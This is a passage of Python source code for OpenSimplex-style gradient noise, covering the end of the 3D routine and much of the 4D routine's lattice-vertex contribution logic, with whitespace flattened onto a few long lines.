dy1 * dy1 - dz1 * dz1 if attn1 > 0 : attn1 *= attn1 value += attn1 * attn1 * extrapolate ( xsb + 1 , ysb + 0 , zsb + 0 , dx1 , dy1 , dz1 ) # Contribution (0,1,0) dx2 = dx0 - 0 - SQUISH_CONSTANT_3D dy2 = dy0 - 1 - SQUISH_CONSTANT_3D dz2 = dz1 attn2 = 2 - dx2 * dx2 - dy2 * dy2 - dz2 * dz2 if attn2 > 0 : attn2 *= attn2 value += attn2 * attn2 * extrapolate ( xsb + 0 , ysb + 1 , zsb + 0 , dx2 , dy2 , dz2 ) # Contribution (0,0,1) dx3 = dx2 dy3 = dy1 dz3 = dz0 - 1 - SQUISH_CONSTANT_3D attn3 = 2 - dx3 * dx3 - dy3 * dy3 - dz3 * dz3 if attn3 > 0 : attn3 *= attn3 value += attn3 * attn3 * extrapolate ( xsb + 0 , ysb + 0 , zsb + 1 , dx3 , dy3 , dz3 ) # Contribution (1,1,0) dx4 = dx0 - 1 - 2 * SQUISH_CONSTANT_3D dy4 = dy0 - 1 - 2 * SQUISH_CONSTANT_3D dz4 = dz0 - 0 - 2 * SQUISH_CONSTANT_3D attn4 = 2 - dx4 * dx4 - dy4 * dy4 - dz4 * dz4 if attn4 > 0 : attn4 *= attn4 value += attn4 * attn4 * extrapolate ( xsb + 1 , ysb + 1 , zsb + 0 , dx4 , dy4 , dz4 ) # Contribution (1,0,1) dx5 = dx4 dy5 = dy0 - 0 - 2 * SQUISH_CONSTANT_3D dz5 = dz0 - 1 - 2 * SQUISH_CONSTANT_3D attn5 = 2 - dx5 * dx5 - dy5 * dy5 - dz5 * dz5 if attn5 > 0 : attn5 *= attn5 value += attn5 * attn5 * extrapolate ( xsb + 1 , ysb + 0 , zsb + 1 , dx5 , dy5 , dz5 ) # Contribution (0,1,1) dx6 = dx0 - 0 - 2 * SQUISH_CONSTANT_3D dy6 = dy4 dz6 = dz5 attn6 = 2 - dx6 * dx6 - dy6 * dy6 - dz6 * dz6 if attn6 > 0 : attn6 *= attn6 value += attn6 * attn6 * extrapolate ( xsb + 0 , ysb + 1 , zsb + 1 , dx6 , dy6 , dz6 ) # First extra vertex attn_ext0 = 2 - dx_ext0 * dx_ext0 - dy_ext0 * dy_ext0 - dz_ext0 * dz_ext0 if attn_ext0 > 0 : attn_ext0 *= attn_ext0 value += attn_ext0 * attn_ext0 * extrapolate ( xsv_ext0 , ysv_ext0 , zsv_ext0 , dx_ext0 , dy_ext0 , dz_ext0 ) # Second extra vertex attn_ext1 = 2 - dx_ext1 * dx_ext1 - dy_ext1 * dy_ext1 - dz_ext1 * dz_ext1 if attn_ext1 > 0 : attn_ext1 *= attn_ext1 value += attn_ext1 * attn_ext1 * extrapolate ( xsv_ext1 , ysv_ext1 , zsv_ext1 , dx_ext1 , dy_ext1 , dz_ext1 ) return value / NORM_CONSTANT_3D
def noise4d ( self , x , y , z , w ) : # Place input coordinates on simplectic honeycomb. stretch_offset = ( x + y + z + w ) * STRETCH_CONSTANT_4D xs = x + stretch_offset ys = y + stretch_offset zs = z + stretch_offset ws = w + stretch_offset # Floor to get simplectic honeycomb coordinates of rhombo-hypercube super-cell origin. xsb = floor ( xs ) ysb = floor ( ys ) zsb = floor ( zs ) wsb = floor ( ws ) # Skew out to get actual coordinates of stretched rhombo-hypercube origin. We'll need these later. squish_offset = ( xsb + ysb + zsb + wsb ) * SQUISH_CONSTANT_4D xb = xsb + squish_offset yb = ysb + squish_offset zb = zsb + squish_offset wb = wsb + squish_offset # Compute simplectic honeycomb coordinates relative to rhombo-hypercube origin. xins = xs - xsb yins = ys - ysb zins = zs - zsb wins = ws - wsb # Sum those together to get a value that determines which region we're in. in_sum = xins + yins + zins + wins # Positions relative to origin po. dx0 = x - xb dy0 = y - yb dz0 = z - zb dw0 = w - wb value = 0 extrapolate = self . _extrapolate4d if in_sum <= 1 : # We're inside the pentachoron (4-Simplex) at (0,0,0,0) # Determine which two of (0,0,0,1), (0,0,1,0), (0,1,0,0), (1,0,0,0) are closest. a_po = 0x01 a_score = xins b_po = 0x02 b_score = yins if a_score >= b_score and zins > b_score : b_score = zins b_po = 0x04 elif a_score < b_score and zins > a_score : a_score = zins a_po = 0x04 if a_score >= b_score and wins > b_score : b_score = wins b_po = 0x08 elif a_score < b_score and wins > a_score : a_score = wins a_po = 0x08 # Now we determine the three lattice pos not part of the pentachoron that may contribute. # This depends on the closest two pentachoron vertices, including (0,0,0,0) uins = 1 - in_sum if uins > a_score or uins > b_score : # (0,0,0,0) is one of the closest two pentachoron vertices. c = b_po if ( b_score > a_score ) else a_po # Our other closest vertex is the closest out of a and b. if ( c & 0x01 ) == 0 : xsv_ext0 = xsb - 1 xsv_ext1 = xsv_ext2 = xsb dx_ext0 = dx0 + 1 dx_ext1 = dx_ext2 = dx0 else : xsv_ext0 = xsv_ext1 = xsv_ext2 = xsb + 1 dx_ext0 = dx_ext1 = dx_ext2 = dx0 - 1 if ( c & 0x02 ) == 0 : ysv_ext0 = ysv_ext1 = ysv_ext2 = ysb dy_ext0 = dy_ext1 = dy_ext2 = dy0 if ( c & 0x01 ) == 0x01 : ysv_ext0 -= 1 dy_ext0 += 1 else : ysv_ext1 -= 1 dy_ext1 += 1 else : ysv_ext0 = ysv_ext1 = ysv_ext2 = ysb + 1 dy_ext0 = dy_ext1 = dy_ext2 = dy0 - 1 if ( c & 0x04 ) == 0 : zsv_ext0 = zsv_ext1 = zsv_ext2 = zsb dz_ext0 = dz_ext1 = dz_ext2 = dz0 if ( c & 0x03 ) != 0 : if ( c & 0x03 ) == 0x03 : zsv_ext0 -= 1 dz_ext0 += 1 else : zsv_ext1 -= 1 dz_ext1 += 1 else : zsv_ext2 -= 1 dz_ext2 += 1 else : zsv_ext0 = zsv_ext1 = zsv_ext2 = zsb + 1 dz_ext0 = dz_ext1 = dz_ext2 = dz0 - 1 if ( c & 0x08 ) == 0 : wsv_ext0 = wsv_ext1 = wsb wsv_ext2 = wsb - 1 dw_ext0 = dw_ext1 = dw0 dw_ext2 = dw0 + 1 else : wsv_ext0 = wsv_ext1 = wsv_ext2 = wsb + 1 dw_ext0 = dw_ext1 = dw_ext2 = dw0 - 1 else : # (0,0,0,0) is not one of the closest two pentachoron vertices. c = ( a_po | b_po ) # Our three extra vertices are determined by the closest two. if ( c & 0x01 ) == 0 : xsv_ext0 = xsv_ext2 = xsb xsv_ext1 = xsb - 1 dx_ext0 = dx0 - 2 * SQUISH_CONSTANT_4D dx_ext1 = dx0 + 1 - SQUISH_CONSTANT_4D dx_ext2 = dx0 - SQUISH_CONSTANT_4D else : xsv_ext0 = xsv_ext1 = xsv_ext2 = xsb + 1 dx_ext0 = dx0 - 1 - 2 * SQUISH_CONSTANT_4D dx_ext1 = dx_ext2 = dx0 - 1 - SQUISH_CONSTANT_4D if ( c & 0x02 ) == 0 : ysv_ext0 = ysv_ext1 = ysv_ext2 = ysb dy_ext0 = dy0 - 2 * SQUISH_CONSTANT_4D dy_ext1 = dy_ext2 = dy0 - SQUISH_CONSTANT_4D if ( c & 0x01 ) == 0x01 : ysv_ext1 -= 1 dy_ext1 += 1 else : ysv_ext2 -= 1 dy_ext2 += 1 else : ysv_ext0 = ysv_ext1 = ysv_ext2 = ysb + 1 dy_ext0 = dy0 - 1 - 2 * SQUISH_CONSTANT_4D dy_ext1 = dy_ext2 = dy0 - 1 - SQUISH_CONSTANT_4D if ( c & 0x04 ) == 0 : zsv_ext0 = zsv_ext1 = zsv_ext2 = zsb dz_ext0 = dz0 - 2 * SQUISH_CONSTANT_4D dz_ext1 = dz_ext2 = dz0 - SQUISH_CONSTANT_4D if ( c & 0x03 ) == 0x03 : zsv_ext1 -= 1 dz_ext1 += 1 else : zsv_ext2 -= 1 dz_ext2 += 1 else : zsv_ext0 = zsv_ext1 = zsv_ext2 = zsb + 1 dz_ext0 = dz0 - 1 - 2 * SQUISH_CONSTANT_4D dz_ext1 = dz_ext2 = dz0 - 1 - SQUISH_CONSTANT_4D if ( c & 0x08 ) == 0 : wsv_ext0 = wsv_ext1 = wsb wsv_ext2 = wsb - 1 dw_ext0 = dw0 - 2 * SQUISH_CONSTANT_4D dw_ext1 = dw0 - SQUISH_CONSTANT_4D dw_ext2 = dw0 + 1 - SQUISH_CONSTANT_4D else : wsv_ext0 = wsv_ext1 = wsv_ext2 = wsb + 1 dw_ext0 = dw0 - 1 - 2 * SQUISH_CONSTANT_4D dw_ext1 = dw_ext2 = dw0 - 1 - SQUISH_CONSTANT_4D # Contribution (0,0,0,0) attn0 = 2 - dx0 * dx0 - dy0 * dy0 - dz0 * dz0 - dw0 * dw0 if attn0 > 0 : attn0 *= attn0 value += attn0 * attn0 * extrapolate ( xsb + 0 , ysb + 0 , zsb + 0 , wsb + 0 , dx0 , dy0 , dz0 , dw0 ) # Contribution (1,0,0,0) dx1 = dx0 - 1 - SQUISH_CONSTANT_4D dy1 = dy0 - 0 - SQUISH_CONSTANT_4D dz1 = dz0 - 0 - SQUISH_CONSTANT_4D dw1 = dw0 - 0 - SQUISH_CONSTANT_4D attn1 = 2 - dx1 * dx1 - dy1 * dy1 - dz1 * dz1 - dw1 * dw1 if attn1 > 0 : attn1 *= attn1 value += attn1 * attn1 * extrapolate ( xsb + 1 , ysb + 0 , zsb + 0 , wsb + 0 , dx1 , dy1 , dz1 , dw1 ) # Contribution (0,1,0,0) dx2 = dx0 - 0 - SQUISH_CONSTANT_4D dy2 = dy0 - 1 - SQUISH_CONSTANT_4D dz2 = dz1 dw2 = dw1 attn2 = 2 - dx2 * dx2 - dy2 * dy2 - dz2 * dz2 - dw2 * dw2 if attn2 > 0 : attn2 *= attn2 value += attn2 * attn2 * extrapolate ( xsb + 0 , ysb + 1 , zsb + 0 , wsb + 0 , dx2 , dy2 , dz2 , dw2 ) # Contribution (0,0,1,0) dx3 = dx2 dy3 = dy1 dz3 = dz0 - 1 - SQUISH_CONSTANT_4D dw3 = dw1 attn3 = 2 - dx3 * dx3 - dy3 * dy3 - dz3 * dz3 - dw3 * dw3 if attn3 > 0 : attn3 *= attn3 value += attn3 * attn3 * extrapolate ( xsb + 0 , ysb + 0 , zsb + 1 , wsb + 0 , dx3 , dy3 , dz3 , dw3 ) # Contribution (0,0,0,1) dx4 = dx2 dy4 = dy1 dz4 = dz1 dw4 = dw0 - 1 - SQUISH_CONSTANT_4D attn4 = 2 - dx4 * dx4 - dy4 * dy4 - dz4 * dz4 - dw4 * dw4 if attn4 > 0 : attn4 *= attn4 value += attn4 * attn4 * extrapolate ( xsb + 0 , ysb + 0 , zsb + 0 , wsb + 1 , dx4 , dy4 , dz4 , dw4 ) elif in_sum >= 3 : # We're inside the pentachoron (4-Simplex) at (1,1,1,1) # Determine which two of (1,1,1,0), (1,1,0,1), (1,0,1,1), (0,1,1,1) are closest. a_po = 0x0E a_score = xins b_po = 0x0D b_score = yins if a_score <= b_score and zins < b_score : b_score = zins b_po = 0x0B elif a_score > b_score and zins < a_score : a_score = zins a_po = 0x0B if a_score <= b_score and wins < b_score : b_score = wins b_po = 0x07 elif a_score > b_score and wins < a_score : a_score = wins a_po = 0x07 # Now we determine the three lattice pos not part of the pentachoron that may contribute. # This depends on the closest two pentachoron vertices, including (0,0,0,0) uins = 4 - in_sum if uins < a_score or uins < b_score : # (1,1,1,1) is one of the closest two pentachoron vertices. c = b_po if ( b_score < a_score ) else a_po # Our other closest vertex is the closest out of a and b. if ( c & 0x01 ) != 0 : xsv_ext0 = xsb + 2 xsv_ext1 = xsv_ext2 = xsb + 1 dx_ext0 = dx0 - 2 - 4 * SQUISH_CONSTANT_4D dx_ext1 = dx_ext2 = dx0 - 1 - 4 * SQUISH_CONSTANT_4D else : xsv_ext0 = xsv_ext1 = xsv_ext2 = xsb dx_ext0 = dx_ext1 = dx_ext2 = dx0 - 4 * SQUISH_CONSTANT_4D if ( c & 0x02 ) != 0 : ysv_ext0 = ysv_ext1 = ysv_ext2 = ysb + 1 dy_ext0 = dy_ext1 = dy_ext2 = dy0 - 1 - 4 * SQUISH_CONSTANT_4D if ( c & 0x01 ) != 0 : ysv_ext1 += 1 dy_ext1 -= 1 else : ysv_ext0 += 1 dy_ext0 -= 1 else : ysv_ext0 = ysv_ext1 = ysv_ext2 = ysb dy_ext0 = dy_ext1 = dy_ext2 = dy0 - 4 * SQUISH_CONSTANT_4D if ( c & 0x04 ) != 0 : zsv_ext0 = zsv_ext1 = zsv_ext2 = zsb + 1 dz_ext0 = dz_ext1 = dz_ext2 = dz0 - 1 - 4 * SQUISH_CONSTANT_4D if ( c & 0x03 ) != 0x03 : if ( c & 0x03 ) == 0 : zsv_ext0 += 1 dz_ext0 -= 1 else : zsv_ext1 += 1 dz_ext1 -= 1 else : zsv_ext2 += 1 dz_ext2 -= 1 else : zsv_ext0 = zsv_ext1 = zsv_ext2 = zsb dz_ext0 = dz_ext1 = dz_ext2 = dz0 - 4 * SQUISH_CONSTANT_4D if ( c & 0x08 ) != 0 : wsv_ext0 = wsv_ext1 = wsb + 1 wsv_ext2 = wsb + 2 dw_ext0 = dw_ext1 = dw0 - 1 - 4 * SQUISH_CONSTANT_4D dw_ext2 = dw0 - 2 - 4 * SQUISH_CONSTANT_4D else : wsv_ext0 = wsv_ext1 = wsv_ext2 = wsb dw_ext0 = dw_ext1 = dw_ext2 = dw0 - 4 * SQUISH_CONSTANT_4D else : # (1,1,1,1) is not one of the closest two pentachoron vertices. c = ( a_po & b_po ) # Our three extra vertices are determined by the closest two. if ( c & 0x01 ) != 0 : xsv_ext0 = xsv_ext2 = xsb + 1 xsv_ext1 = xsb + 2 dx_ext0 = dx0 - 1 - 2 * SQUISH_CONSTANT_4D dx_ext1 = dx0 - 2 - 3 * SQUISH_CONSTANT_4D dx_ext2 = dx0 - 1 - 3 * SQUISH_CONSTANT_4D else : xsv_ext0 = xsv_ext1 = xsv_ext2 = xsb dx_ext0 = dx0 - 2 * SQUISH_CONSTANT_4D dx_ext1 = dx_ext2 = dx0 - 3 * SQUISH_CONSTANT_4D if ( c & 0x02 ) != 0 : ysv_ext0 = ysv_ext1 = ysv_ext2 = ysb + 1 dy_ext0 = dy0 - 1 - 2 * SQUISH_CONSTANT_4D dy_ext1 = dy_ext2 = dy0 - 1 - 3 * SQUISH_CONSTANT_4D if ( c & 0x01 ) != 0 : ysv_ext2 += 1 dy_ext2 -= 1 else : ysv_ext1 += 1 dy_ext1 -= 1 else : ysv_ext0 = ysv_ext1 = ysv_ext2 = ysb dy_ext0 = dy0 - 2 * SQUISH_CONSTANT_4D dy_ext1 = dy_ext2 = dy0 - 3 * SQUISH_CONSTANT_4D if ( c & 0x04 ) != 0 : zsv_ext0 = zsv_ext1 = zsv_ext2 = zsb + 1 dz_ext0 = dz0 - 1 - 2 * SQUISH_CONSTANT_4D dz_ext1 = dz_ext2 = dz0 - 1 - 3 * SQUISH_CONSTANT_4D if ( c & 0x03 ) != 0 : zsv_ext2 += 1 dz_ext2 -= 1 else : zsv_ext1 += 1 dz_ext1 -= 1 else : zsv_ext0 = zsv_ext1 = zsv_ext2 = zsb dz_ext0 = dz0 - 2 * SQUISH_CONSTANT_4D dz_ext1 = dz_ext2 = dz0 - 3 * SQUISH_CONSTANT_4D if ( c & 0x08 ) != 0 : wsv_ext0 = wsv_ext1 = wsb + 1 wsv_ext2 = wsb + 2 dw_ext0 = dw0 - 1 - 2 * SQUISH_CONSTANT_4D dw_ext1 = dw0 - 1 - 3 * SQUISH_CONSTANT_4D dw_ext2 = dw0 - 2 - 3 * SQUISH_CONSTANT_4D else : wsv_ext0 = wsv_ext1 = wsv_ext2 = wsb dw_ext0 = dw0 - 2 * SQUISH_CONSTANT_4D dw_ext1 = dw_ext2 = dw0 - 3 * SQUISH_CONSTANT_4D # Contribution (1,1,1,0) dx4 = dx0 - 1 - 3 * SQUISH_CONSTANT_4D dy4 = dy0 - 1 - 3 * SQUISH_CONSTANT_4D dz4 = dz0 - 1 - 3 * SQUISH_CONSTANT_4D dw4 = dw0 - 3 * SQUISH_CONSTANT_4D attn4 = 2 - dx4 * dx4 - dy4 * dy4 - dz4 * dz4 - dw4 * dw4 if attn4 > 0 : attn4 *= attn4 value += attn4 * attn4 * extrapolate ( xsb + 1 , ysb + 1 , zsb + 1 , wsb + 0 , dx4 , dy4 , dz4 , dw4 ) # Contribution (1,1,0,1) dx3 = dx4 dy3 = dy4 dz3 = dz0 - 3 * SQUISH_CONSTANT_4D dw3 = dw0 - 1 - 3 * SQUISH_CONSTANT_4D attn3 = 2 - dx3 * dx3 - dy3 * dy3 - dz3 * dz3 - dw3 * dw3 if attn3 > 0 : attn3 *= attn3 value += attn3 * attn3 * extrapolate ( xsb + 1 , ysb + 1 , zsb + 0 , wsb + 1 , dx3 , dy3 , dz3 , dw3 ) # Contribution (1,0,1,1) dx2 = dx4 dy2 = dy0 - 3 * SQUISH_CONSTANT_4D dz2 = dz4 dw2 = dw3 attn2 = 2 - dx2 * dx2 - dy2 * dy2 - dz2 * dz2 - dw2 * dw2 if attn2 > 0 : attn2 *= attn2 value += attn2 * attn2 * extrapolate ( xsb + 1 , ysb + 0 , zsb + 1 , wsb + 1 , dx2 , dy2 , dz2 , dw2 ) # Contribution (0,1,1,1) dx1 = dx0 - 3 * SQUISH_CONSTANT_4D dz1 = dz4 dy1 = dy4 dw1 = dw3 attn1 = 2 - dx1 * dx1 - dy1 * dy1 - dz1 * dz1 - dw1 * dw1 if attn1 > 0 : attn1 *= attn1 value += attn1 * attn1 * extrapolate ( xsb + 0 , ysb + 1 , zsb + 1 , wsb + 1 , dx1 , dy1 , dz1 , dw1 ) # Contribution (1,1,1,1) dx0 = dx0 - 1 - 4 * SQUISH_CONSTANT_4D dy0 = dy0 - 1 - 4 * SQUISH_CONSTANT_4D dz0 = dz0 - 1 - 4 * SQUISH_CONSTANT_4D dw0 = dw0 - 1 - 4 * SQUISH_CONSTANT_4D attn0 = 2 - dx0 * dx0 - dy0 * dy0 - dz0 * dz0 - dw0 * dw0 if attn0 > 0 : attn0 *= attn0 value += attn0 * attn0 * extrapolate ( xsb + 1 , ysb + 1 , zsb + 1 , wsb + 1 , dx0 , dy0 , dz0 , dw0 ) elif in_sum <= 2 : # We're inside the first dispentachoron (Rectified 4-Simplex) a_is_bigger_side = True b_is_bigger_side = True # Decide between (1,1,0,0) and (0,0,1,1) if xins + yins > zins + wins : a_score = xins + yins a_po = 0x03 else : a_score = zins + wins a_po = 0x0C # Decide between (1,0,1,0) and (0,1,0,1) if xins + zins > yins + wins : b_score = xins + zins b_po = 0x05 else : b_score = yins + wins b_po = 0x0A # Closer between (1,0,0,1) and (0,1,1,0) will replace the further of a and b, if closer. if xins + wins > yins + zins : score = xins + wins if a_score >= b_score and score > b_score : b_score = score b_po = 0x09 elif a_score < b_score and score > a_score : a_score = score a_po = 0x09 else : score = yins + zins if a_score >= b_score and score > b_score : b_score = score b_po = 0x06 elif a_score < b_score and score > a_score : a_score = score a_po = 0x06 # Decide if (1,0,0,0) is closer. p1 = 2 - in_sum + xins if a_score >= b_score and p1 > b_score : b_score = p1 b_po = 0x01 b_is_bigger_side = False elif a_score < b_score and p1 > a_score : a_score = p1 a_po = 0x01 a_is_bigger_side = False # Decide if (0,1,0,0) is closer. p2 = 2 - in_sum + yins if a_score >= b_score and p2 > b_score : b_score = p2 b_po = 0x02 b_is_bigger_side = False elif a_score < b_score and p2 > a_score : a_score = p2 a_po = 0x02 a_is_bigger_side = False # Decide if (0,0,1,0) is closer. p3 = 2 - in_sum + zins if a_score >= b_score and p3 > b_score : b_score = p3 b_po = 0x04 b_is_bigger_side = False elif a_score < b_score and p3 > a_score : a_score = p3 a_po = 0x04 a_is_bigger_side = False # Decide if (0,0,0,1) is closer. p4 = 2 - in_sum + wins if a_score >= b_score and p4 > b_score : b_po = 0x08 b_is_bigger_side = False elif a_score < b_score and p4 > a_score : a_po = 0x08 a_is_bigger_side = False # Where each of the two closest pos are determines how the extra three vertices are calculated. if a_is_bigger_side == b_is_bigger_side : if a_is_bigger_side : # Both closest pos on the bigger side c1 = ( a_po | b_po ) c2 = ( a_po & b_po ) if ( c1 & 0x01 ) == 0 : xsv_ext0 = xsb xsv_ext1 = xsb - 1 dx_ext0 = dx0 - 3 * SQUISH_CONSTANT_4D dx_ext1 = dx0 + 1 - 2 * SQUISH_CONSTANT_4D else : xsv_ext0 = xsv_ext1 = xsb + 1 dx_ext0 = dx0 - 1 - 3 * SQUISH_CONSTANT_4D dx_ext1 = dx0 - 1 - 2 * SQUISH_CONSTANT_4D if ( c1 & 0x02 ) == 0 : ysv_ext0 = ysb ysv_ext1 = ysb - 1 dy_ext0 = dy0 - 3 * SQUISH_CONSTANT_4D dy_ext1 = dy0 + 1 - 2 * SQUISH_CONSTANT_4D else : ysv_ext0 = ysv_ext1 = ysb + 1 dy_ext0 = dy0 - 1 - 3 * SQUISH_CONSTANT_4D dy_ext1 = dy0 - 1 - 2 * SQUISH_CONSTANT_4D if ( c1 & 0x04 ) == 0 : zsv_ext0 = zsb zsv_ext1 = zsb - 1 dz_ext0 = dz0 - 3 * SQUISH_CONSTANT_4D dz_ext1 = dz0 + 1 - 2 * SQUISH_CONSTANT_4D else : zsv_ext0 = zsv_ext1 = zsb + 1 dz_ext0 = dz0 - 1 - 3 * SQUISH_CONSTANT_4D dz_ext1 = dz0 - 1 - 2 * SQUISH_CONSTANT_4D if ( c1 & 0x08 ) == 0 : wsv_ext0 = wsb wsv_ext1 = wsb - 1 dw_ext0 = dw0 - 3 * SQUISH_CONSTANT_4D dw_ext1 = dw0 + 1 - 2 * SQUISH_CONSTANT_4D else : wsv_ext0 = wsv_ext1 = wsb + 1 dw_ext0 = dw0 - 1 - 3 * SQUISH_CONSTANT_4D dw_ext1 = dw0 - 1 - 2 * SQUISH_CONSTANT_4D # One combination is a _permutation of (0,0,0,2) based on c2 xsv_ext2 = xsb ysv_ext2 = ysb zsv_ext2 = zsb wsv_ext2 = wsb dx_ext2 = dx0 - 2 * SQUISH_CONSTANT_4D dy_ext2 = dy0 - 2 * SQUISH_CONSTANT_4D dz_ext2 = dz0 - 2 * SQUISH_CONSTANT_4D dw_ext2 = dw0 - 2 * SQUISH_CONSTANT_4D if ( c2 & 0x01 ) != 0 : xsv_ext2 += 2 dx_ext2 -= 2 elif ( c2 & 0x02 ) != 0 : ysv_ext2 += 2 dy_ext2 -= 2 elif ( c2 & 0x04 ) != 0 : zsv_ext2 += 2 dz_ext2 -= 2 else : wsv_ext2 += 2 dw_ext2 -= 2 else : # Both closest pos on the smaller side # One of the two extra pos is (0,0,0,0) xsv_ext2 = xsb ysv_ext2 = ysb zsv_ext2 = zsb wsv_ext2 = wsb dx_ext2 = dx0 dy_ext2 = dy0 dz_ext2 = dz0 dw_ext2 = dw0 # Other two pos are based on the omitted axes. c = ( a_po | b_po ) if ( c & 0x01 ) == 0 : xsv_ext0 = xsb - 1 xsv_ext1 = xsb dx_ext0 = dx0 + 1 - SQUISH_CONSTANT_4D dx_ext1 = dx0 - SQUISH_CONSTANT_4D else : xsv_ext0 = xsv_ext1 = xsb + 1 dx_ext0 = dx_ext1 = dx0 - 1 - SQUISH_CONSTANT_4D if ( c & 0x02 ) == 0 : ysv_ext0 = ysv_ext1 = ysb dy_ext0 = dy_ext1 = dy0 - SQUISH_CONSTANT_4D if ( c & 0x01 ) == 0x01 : ysv_ext0 -= 1 dy_ext0 += 1 else : ysv_ext1 -= 1 dy_ext1 += 1 else : ysv_ext0 = ysv_ext1 = ysb + 1 dy_ext0 = dy_ext1 = dy0 - 1 - SQUISH_CONSTANT_4D if ( c & 0x04 ) == 0 : zsv_ext0 = zsv_ext1 = zsb dz_ext0 = dz_ext1 = dz0 - SQUISH_CONSTANT_4D if ( c & 0x03 ) == 0x03 : zsv_ext0 -= 1 dz_ext0 += 1 else : zsv_ext1 -= 1 dz_ext1 += 1 else : zsv_ext0 = zsv_ext1 = zsb + 1 dz_ext0 = dz_ext1 = dz0 - 1 - SQUISH_CONSTANT_4D if ( c & 0x08 ) == 0 : wsv_ext0 = wsb wsv_ext1 = wsb - 1 dw_ext0 = dw0 - SQUISH_CONSTANT_4D dw_ext1 = dw0 + 1 - SQUISH_CONSTANT_4D else : wsv_ext0 = wsv_ext1 = wsb + 1 dw_ext0 = dw_ext1 = dw0 - 1 - SQUISH_CONSTANT_4D else : # One po on each "side" if a_is_bigger_side : c1 = a_po c2 = b_po else : c1 = b_po c2 = a_po # Two contributions are the bigger-sided po with each 0 replaced with -1. if ( c1 & 0x01 ) == 0 : xsv_ext0 = xsb - 1 xsv_ext1 = xsb dx_ext0 = dx0 + 1 - SQUISH_CONSTANT_4D dx_ext1 = dx0 - SQUISH_CONSTANT_4D else : xsv_ext0 = xsv_ext1 = xsb + 1 dx_ext0 = dx_ext1 = dx0 - 1 - SQUISH_CONSTANT_4D if ( c1 & 0x02 ) == 0 : ysv_ext0 = ysv_ext1 = ysb dy_ext0 = dy_ext1 = dy0 - SQUISH_CONSTANT_4D if ( c1 & 0x01 ) == 0x01 : ysv_ext0 -= 1 dy_ext0 += 1 else : ysv_ext1 -= 1 dy_ext1 += 1 else : ysv_ext0 = ysv_ext1 = ysb + 1 dy_ext0 = dy_ext1 = dy0 - 1 - SQUISH_CONSTANT_4D if ( c1 & 0x04 ) == 0 : zsv_ext0 = zsv_ext1 = zsb dz_ext0 = dz_ext1 = dz0 - SQUISH_CONSTANT_4D if ( c1 & 0x03 ) == 0x03 : zsv_ext0 -= 1 dz_ext0 += 1 else : zsv_ext1 -= 1 dz_ext1 += 1 else : zsv_ext0 = zsv_ext1 = zsb + 1 dz_ext0 = dz_ext1 = dz0 - 1 - SQUISH_CONSTANT_4D if ( c1 & 0x08 ) == 0 : wsv_ext0 = wsb wsv_ext1 = wsb - 1 dw_ext0 = dw0 - SQUISH_CONSTANT_4D dw_ext1 = dw0 + 1 - SQUISH_CONSTANT_4D else : wsv_ext0 = wsv_ext1 = wsb + 1 dw_ext0 = dw_ext1 = dw0 - 1 - SQUISH_CONSTANT_4D # One contribution is a _permutation of (0,0,0,2) based on the smaller-sided po xsv_ext2 = xsb ysv_ext2 = ysb zsv_ext2 = zsb wsv_ext2 = wsb dx_ext2 = dx0 - 2 * SQUISH_CONSTANT_4D dy_ext2 = dy0 - 2 * SQUISH_CONSTANT_4D dz_ext2 = dz0 - 2 * SQUISH_CONSTANT_4D dw_ext2 = dw0 - 2 * SQUISH_CONSTANT_4D if ( c2 & 0x01 ) != 0 : xsv_ext2 += 2 dx_ext2 -= 2 elif ( c2 & 0x02 ) != 0 : ysv_ext2 += 2 dy_ext2 -= 2 elif ( c2 & 0x04 ) != 0 : zsv_ext2 += 2 dz_ext2 -= 2 else : wsv_ext2 += 2 dw_ext2 -= 2 # Contribution (1,0,0,0) dx1 = dx0 - 1 - SQUISH_CONSTANT_4D dy1 = dy0 - 0 - SQUISH_CONSTANT_4D dz1 = dz0 - 0 - SQUISH_CONSTANT_4D dw1 = dw0 - 0 - SQUISH_CONSTANT_4D attn1 = 2 - dx1 * dx1 - dy1 * dy1 - dz1 * dz1 - dw1 * dw1 if attn1 > 0 : attn1 *= attn1 value += attn1 * attn1 * extrapolate ( xsb + 1 , ysb + 0 , zsb + 0 , wsb + 0 , dx1 , dy1 , dz1 , dw1 ) # Contribution (0,1,0,0) dx2 = dx0 - 0 - SQUISH_CONSTANT_4D dy2 = dy0 - 1 - SQUISH_CONSTANT_4D dz2 = dz1 dw2 = dw1 attn2 = 2 - dx2 * dx2 - dy2 * dy2 - dz2 * dz2 - dw2 * dw2 if attn2 > 0 : attn2 *= attn2 value += attn2 * attn2 * extrapolate ( xsb + 0 , ysb + 1 , zsb + 0 , wsb + 0 , dx2 , dy2 , dz2 , dw2 ) # Contribution (0,0,1,0) dx3 = dx2 dy3 = dy1 dz3 = dz0 - 1 - SQUISH_CONSTANT_4D dw3 = dw1 attn3 = 2 - dx3 * dx3 - dy3 * dy3 - dz3 * dz3 - dw3 * dw3 if attn3 > 0 : attn3 *= attn3 value += attn3 * attn3 * extrapolate ( xsb + 0 , ysb + 0 , zsb + 1 , wsb + 0 , dx3 , dy3 , dz3 , dw3 ) # Contribution (0,0,0,1) dx4 = dx2 dy4 = dy1 dz4 = dz1 dw4 = dw0 - 1 - SQUISH_CONSTANT_4D attn4 = 2 - dx4 * dx4 - dy4 * dy4 - dz4 * dz4 - dw4 * dw4 if attn4 > 0 : attn4 *= attn4 value += attn4 * attn4 * extrapolate ( xsb + 0 , ysb + 0 , zsb + 0 , wsb + 1 , dx4 , dy4 , dz4 , dw4 ) # Contribution (1,1,0,0) dx5 = dx0 - 1 - 2 * SQUISH_CONSTANT_4D dy5 = dy0 - 1 - 2 * SQUISH_CONSTANT_4D dz5 = dz0 - 0 - 2 * SQUISH_CONSTANT_4D dw5 = dw0 - 0 - 2 * SQUISH_CONSTANT_4D attn5 = 2 - dx5 * dx5 - dy5 * dy5 - dz5 * dz5 - dw5 * dw5 if attn5 > 0 : attn5 *= attn5 value += attn5 * attn5 * extrapolate ( xsb + 1 , ysb + 1 , zsb + 0 , wsb + 0 , dx5 , dy5 , dz5 , dw5 ) # Contribution (1,0,1,0) dx6 = dx0 - 1 - 2 * SQUISH_CONSTANT_4D dy6 = dy0 - 0 - 2 * SQUISH_CONSTANT_4D dz6 = dz0 - 1 - 2 * SQUISH_CONSTANT_4D dw6 = dw0 - 0 - 2 * SQUISH_CONSTANT_4D attn6 = 2 - dx6 * dx6 - dy6 * dy6 - dz6 * dz6 - dw6 * dw6 if attn6 > 0 : attn6 *= attn6 value += attn6 * attn6 * extrapolate ( xsb + 1 , ysb + 0 , zsb + 1 , wsb + 0 , dx6 , dy6 , dz6 , dw6 ) # Contribution (1,0,0,1) 